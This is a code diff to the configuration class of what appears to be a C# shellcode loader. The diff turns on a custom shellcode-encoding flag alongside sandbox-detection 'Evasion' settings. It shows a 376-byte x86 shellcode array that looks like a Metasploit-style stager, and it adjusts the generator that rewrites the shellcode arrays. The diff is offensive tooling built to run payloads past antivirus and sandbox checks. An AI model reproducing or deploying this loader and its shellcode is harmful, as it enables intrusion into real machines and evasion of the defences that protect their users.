@@ -27,7 +27,7 @@ public static class CONFIG
 
 
     //Evasion
-    public static bool ENCODED = false; //Meaning that you have used the custom encoder (From the helper tool) on the shell code. Not MSFVenom encoders. This ensures your shellcode will get decoded first.
+    public static bool ENCODED = true; //Meaning that you have used the custom encoder (From the helper tool) on the shell code. Not MSFVenom encoders. This ensures your shellcode will get decoded first.
     public static byte KEY = 0xf4;
     public static bool DETECT_SANDBOX_TIME = false; //Detect time dilation
     public static bool DETECT_SANDBOX_BAD_IMPORT = false; 
@@ -97,6 +97,14 @@ public static class CONFIG
 
 
 
+
+
+
+
+
+
+
+
     public static byte[] SHELLCODE86 = new byte[376] {
 0xfc,0xe8,0x90,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0x0c,0x8b,0x52,
 0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x24,0xbf,0x17,0x82,0x81,0x29,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
@@ -117,6 +125,14 @@ public static class CONFIG
 0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,
 0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xa0,0xde,0x84,0x1e,0x68,0x65,0x56,0x18,0xb2,0xff,0xd5,0x3c,0x06,0x7c,
 0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x2a,0xad,0x48,0x60,0x6a,0x00,0x53,0xff,0xd5};
+
+
+
+
+
+
+
+
 
 
 
@@ -330,14 +346,14 @@ public static class CONFIG
         sb64.Append($"SHELLCODE64 = ");
         sb64.Append($"new byte[{bytes64.Length}] {{\n");
         sb64.Append(CONFIG.BeautifyBytes(bytes64, 20));
-        sb64.Append("};\n\n");
+        sb64.Append("};");
         g = Regex.Replace(g, sc64_matcher, sb64.ToString());
 
         StringBuilder sb86 = new StringBuilder();
         sb86.Append($"SHELLCODE86 = ");
         sb86.Append($"new byte[{bytes86.Length}] {{\n");
         sb86.Append(CONFIG.BeautifyBytes(bytes86, 20));
-        sb86.Append("};\n\n");
+        sb86.Append("};");
         g = Regex.Replace(g, sc86_matcher, sb86.ToString());
 
 
